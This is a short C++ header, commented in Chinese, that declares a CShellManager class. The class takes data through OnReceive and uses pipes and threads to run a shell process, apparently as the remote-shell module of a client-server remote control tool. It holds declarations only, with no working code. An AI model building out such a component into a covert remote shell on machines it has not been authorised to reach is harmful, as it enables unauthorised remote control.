/**
 * ShellManager扩展了基类的功能
 * 实现了shell的基本功能。
**/

#ifndef SHELLMANAGER_H_INCLUDED
#define SHELLMANAGER_H_INCLUDED


#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "BasicManager.h"

//class CBasicManager;
class CShellManager : public CBasicManager  
{
public:
	CShellManager(CClient *pClient);
	virtual ~CShellManager();
	virtual void OnReceive(char* lpBuff,int size);
private:
	HANDLE m_hReadPipeHandle;   
	HANDLE m_hWritePipeHandle; 
	HANDLE m_hReadPipeShell;
	HANDLE m_hWritePipeShell;

	HANDLE m_hProcessHandle;
	HANDLE m_hThreadHandle;
	HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;
	HANDLE m_hThreadWork;

	static DWORD WINAPI ReadPipeThread(LPVOID lparam);
	static DWORD WINAPI MonitorThread(LPVOID lparam);
	static DWORD WINAPI WorkThread(LPVOID lparam);
};
#endif